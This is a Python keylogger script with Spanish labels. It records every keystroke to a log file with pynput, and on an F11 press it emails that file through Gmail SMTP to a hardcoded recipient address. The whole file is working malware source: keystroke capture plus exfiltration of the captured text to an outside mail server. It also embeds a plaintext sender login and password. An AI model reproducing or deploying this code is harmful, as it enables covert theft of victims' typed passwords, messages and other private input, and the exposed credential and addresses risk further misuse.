from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

def enviar_correo():
    mensaje = MIMEMultipart("plain")
    mensaje["From"] = "fokolotorolo@gmail.com"
    mensaje["To"] = "felipe.morgado2000@gmail.com"
    mensaje["Subject"] = "Keylogger Definitivo"

    adjunto = MIMEBase("application", "octect-stream")
    adjunto.set_payload(open('log.txt', 'rb').read())
    adjunto.add_header("content-Disposition", 'attachment; filename = "log.txt"')
    mensaje.attach(adjunto)

    server = SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("fokolotorolo@gmail.com", "uczb gctp ksya xzul")
    server.sendmail("fokolotorolo@gmail.com", "felipe.morgado2000@gmail.com", mensaje.as_string().encode('utf-8'))

    server.quit()

def keyboard_listener(key):
    letra = str(key)
    letra = letra.replace("'", "")

    if letra == 'Key.space':
        letra = ' '
    elif letra == 'Key.enter':
        letra = '\n'
    elif letra == 'Key.shift_r':
        letra = ''
    elif letra == 'Key.shift_l':
        letra = ''
    elif letra == 'Key.delete':
        letra = ''
    elif letra == 'Key.ctrl_l':
        letra = ''
    elif letra == 'Key.backspace':
        letra = ''
    elif letra == 'Key.ctrl_r':
        letra = ''
    elif letra == 'Key.caps_lock':
        letra = ''
    elif letra == 'Key.right':
        letra = ''
    elif letra == 'Key.left':
        letra = ''
    elif letra == 'Key.up':
        letra = ''
    elif letra == 'Key.down':
        letra = ''
    elif letra == 'Key.alt_l':
        letra = ''
    elif letra == 'Key.alt_r':
        letra = ''
    elif letra == 'Key.tab':
        letra = '   '
    elif letra == 'Key.f12':
        sys.exit()
    elif letra == 'Key.f11':
        enviar_correo()
    else:
        pass

    with open("log.txt", "a") as f:
        f.write(letra)

def main():
    print("(+) Se inicio el keylogger")
    with Listener(on_press = keyboard_listener) as l:
        l.join()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()